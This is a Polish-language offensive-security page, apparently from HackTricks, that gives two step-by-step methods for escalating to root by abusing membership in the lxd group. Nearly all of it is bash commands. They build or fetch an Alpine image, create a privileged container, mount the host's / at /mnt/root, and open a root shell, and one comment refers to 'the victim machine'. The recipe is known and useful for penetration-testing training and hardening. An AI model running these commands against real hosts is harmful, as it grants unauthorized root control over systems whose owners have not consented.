# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Członkostwo w grupie zarządzania LXD hosta (zwykle _**lxd**_) może zapewnić ścieżkę do root, umożliwiając pełną kontrolę nad daemonem.<sup>[[1]](#references)</sup>

## Exploiting without internet

### Method 1

Możesz pobrać obraz Alpine do użycia z LXD z zaufanego repozytorium.  
Serwer obrazów LXD firmy Canonical publikuje codzienne buildy: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
Pobierz **lxd.tar.xz** oraz **rootfs.squashfs** z najnowszego buildu (nazwa katalogu to data).<sup>[[8]](#references)</sup>

Alternatywnie możesz zainstalować distrobuilder na swojej maszynie, postępując zgodnie z [instrukcjami projektu](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Prześlij **incus.tar.xz** (**lxd.tar.xz** jeśli obraz został pobrany z serwera obrazów Canonical) oraz **rootfs.squashfs**, następnie zaimportuj obraz i utwórz kontener.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Jeśli znajdziesz ten błąd _**Error: No storage pool found. Please create a new storage pool**_\
> Uruchom **`lxd init`**, skonfiguruj domyślny storage pool, a następnie **powtórz** poprzedni fragment poleceń.<sup>[[2]](#references)</sup>

Na koniec uruchom kontener i otwórz powłokę root w systemie plików hosta:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Metoda 2

Zbuduj obraz Alpine i uruchom go z flagą `security.privileged=true`, która mapuje root kontenera na root hosta; zamontowanie `/` udostępnia następnie system plików hosta wewnątrz kontenera.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Jak wzmocnić zabezpieczenia LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Kontenery i maszyny wirtualne LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Jak kopiować i importować obrazy](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Jak tworzyć obrazy za pomocą distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Definicja obrazu Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Skrypt kompilacji lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Serwer obrazów LXD](https://images.lxd.canonical.com/)
- [9] [Typ: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
